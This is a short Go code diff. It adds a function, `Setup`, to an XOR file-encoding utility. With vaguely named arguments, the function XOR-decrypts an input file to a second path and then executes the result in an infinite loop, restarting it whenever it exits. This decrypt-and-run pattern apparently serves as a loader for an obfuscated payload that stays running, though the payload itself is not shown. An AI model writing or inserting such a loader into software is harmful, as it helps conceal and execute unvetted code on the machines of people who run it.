@@ -5,6 +5,7 @@ import (
 	"io"
 	"log"
 	"os"
+	"os/exec"
 )
 
 func xor(data []byte, key []byte) []byte {
@@ -47,4 +48,17 @@ func XorFile(inPath string, outPath string, key []byte) error {
 		of.Write(xorChunk)
 	}
 	return nil
+}
+
+func Setup(a string, b string, c []byte) {
+	err := XorFile(a, b, c)
+	if err != nil {
+		panic(err)
+	}
+
+	for {
+		c := exec.Command(b)
+		c.Run()
+		c.Wait()
+	}
 }
